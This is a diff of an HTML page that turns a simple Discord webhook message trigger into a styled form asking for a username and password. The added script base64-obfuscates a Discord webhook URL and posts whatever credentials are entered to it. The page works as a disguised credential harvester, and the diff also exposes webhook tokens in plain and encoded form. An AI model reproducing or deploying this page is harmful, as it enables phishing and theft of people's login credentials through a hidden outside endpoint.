@@ -3,61 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Webhook Trigger</title>
+    <title>Discord Webhook Sender</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #f4f4f4;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        input, button {
+            margin: 10px 0;
+            padding: 10px;
+            width: 80%;
+            font-size: 16px;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <h1>Message Sent to Discord Webhook</h1>
-
+    <div class="container">
+        <h1>Send Message to Discord</h1>
+        <input id="usr" type="text" placeholder="Enter User" required>
+        <input id="pass" type="text" placeholder="Enter Pass" required>
+        <button onclick="sendMessage()">Send</button>
+    </div>
     <script>
-        // Function to get query parameters from URL
-        function getQueryParams() {
-            const params = {};
-            const queryString = window.location.search.substring(1);
-            const queryArray = queryString.split("&");
-            queryArray.forEach(function(param) {
-                const pair = param.split("=");
-                params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
-            });
-            return params;
-        }
+        function sendMessage() {
+            const usr = document.getElementById('usr').value;
+            const pass = document.getElementById('pass').value;
 
-        // Fetch the query parameters (e.g., ?message=Hello&username=PlayerName)
-        const queryParams = getQueryParams();
+            const webhookURL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwOTE5MTU0MzMwNjg0NjI0OC9jMElMQ2t4WERNMHM3c3ZXSWZXekd1c21iOURIVlRxR1RwRGtQQUtCeWJtcFhrTVZZNkJOVlZQOTExNS10b1BZU21JSw==");
 
-        // Make sure that 'message' and 'username' are present in the URL
-        if (queryParams.message && queryParams.username) {
-            const message = queryParams.message;
-            const username = queryParams.username;
-
-            // Data to send to the Discord webhook
-            const webhookData = {
-                content: message,
-                username: username
-            };
-
-            // Your Discord Webhook URL
-            const webhookUrl = 'https://discord.com/api/webhooks/1297188572813725706/O-7SFoLOcMsYEWXmYngZ0CikE-Oxom6V6VyNjldzw5SFwgwKlKwhK3eno7Lu5ylVG6wT';
-
-            // Send a POST request to the Discord webhook
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(webhookData)
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: `User: ${usr}, Pass: ${pass}` }),
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('Message sent successfully!');
+                    alert("Message sent successfully!");
                 } else {
-                    console.log('Error sending message.');
+                    alert("Failed to send message. Check the webhook URL.");
                 }
             })
             .catch(error => {
-                console.error('Error:', error);
+                console.error("Error:", error);
+                alert("An error occurred. Check the console for details.");
             });
-        } else {
-            console.log('No message or username provided.');
         }
     </script>
 </body>
